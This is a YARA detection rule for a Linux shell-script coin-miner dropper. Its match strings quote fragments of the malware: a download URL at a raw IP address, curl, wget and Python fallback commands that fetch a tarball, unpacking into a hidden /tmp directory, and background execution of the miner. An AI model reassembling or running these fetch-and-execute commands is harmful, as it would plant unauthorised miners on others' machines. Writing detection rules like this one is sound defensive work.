rule SCRIPT_Dropper_CoinMiner_ForgeAuto_92973661
{
    meta:
        author = "Marjoriefort"
        description = "Detects CoinMiner (script_sh, etat binaire)"
        date = "2026-10-01"
        reference_sha256 = "92973661646c318ba4ae5c0bc50c324aefd37dbfe4e1bc0da789c04d21e99c4e"
        yarahub_uuid = "39786892-76a7-4643-b567-5426ca9e22af"
        famille = "CoinMiner"
        famille_source = "reputation"
        classe = "script_sh"
        etat = "binaire"
        confidence_suggeree = "medium"
        source = "forge_miss M3 v1.9.48"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "c1210089a2616bc1ef7ff3e4dceb317e"
        yarahub_reference_link = "https://github.com/Marjoriefort/yara-rules"
    strings:
        $s0 = "URL=http://23.252.123.134:18095/fleet_lin.tgz" ascii
        $s1 = "mkdir -p \"$D\" 2>/dev/null" ascii
        $s2 = "-n \"$DL\" ] || { echo \"NODL $(hostname 2>/dev/null)\"; exit 1; }" ascii
        $s3 = "tar xzf f.tgz 2>/dev/null || { echo \"NOTAR $(hostname 2>/dev/null)\"; exit 1; }" ascii
        $s4 = "H=$(hostname 2>/dev/null | cut -c1-12)" ascii
        $s5 = "sed -i \"s/RIGNAME/$H/\" config.json 2>/dev/null" ascii
        $s6 = "if command -v setsid >/dev/null 2>&1; then" ascii
        $s7 = "NOTAR $(hostname 2>/dev/null)" ascii
        $s8 = "s/RIGNAME/$H/" ascii
        $s9 = "] || { echo" ascii
        $s10 = "lite_mine.sh -" ascii
        $s11 = "curl/wget/python3" ascii
        $s12 = "D=/tmp/.qc$$ 2>/dev/null" ascii
        $s13 = "cd \"$D\" 2>/dev/null || D=/tmp && cd \"$D\" || exit 1" ascii
        $s14 = "if command -v curl >/dev/null 2>&1; then curl -s -m 240 -o f.tgz \"$URL\" && DL=1; fi" ascii
        $s15 = "if [ -z \"$DL\" ] && command -v wget >/dev/null 2>&1; then wget -q -T 240 -O f.tgz \"$URL\" && DL=1; fi" ascii
        $s16 = "if [ -z \"$DL\" ] && command -v python3 >/dev/null 2>&1; then python3 -c \"import urllib.request as u;open('f.tgz','wb').write(u.urlopen('$URL',timeout=240).read())\" 2>/dev/null && DL=1; fi" ascii
        $s17 = "if [ -z \"$DL\" ] && command -v python >/dev/null 2>&1; then python -c \"import urllib2 as u;open('f.tgz','wb').write(u.urlopen('$URL',timeout=240).read())\" 2>/dev/null && DL=1; fi" ascii
        $s18 = "sh run.sh >/dev/null 2>&1 &" ascii
        $s19 = "if pgrep -f \"$D/$p\" >/dev/null 2>&1 || ps aux 2>/dev/null | grep -q \"[.]qc.*/$p\"; then OK=\"$OK $p\"; fi" ascii
    condition:
        true and filesize < 50MB and 2 of ($s1, $s2, $s3, $s4, $s5, $s6, $s7, $s8, $s9, $s10, $s11, $s12, $s13, $s14, $s15, $s16, $s17, $s18, $s19) and 1 of ($s0)
}
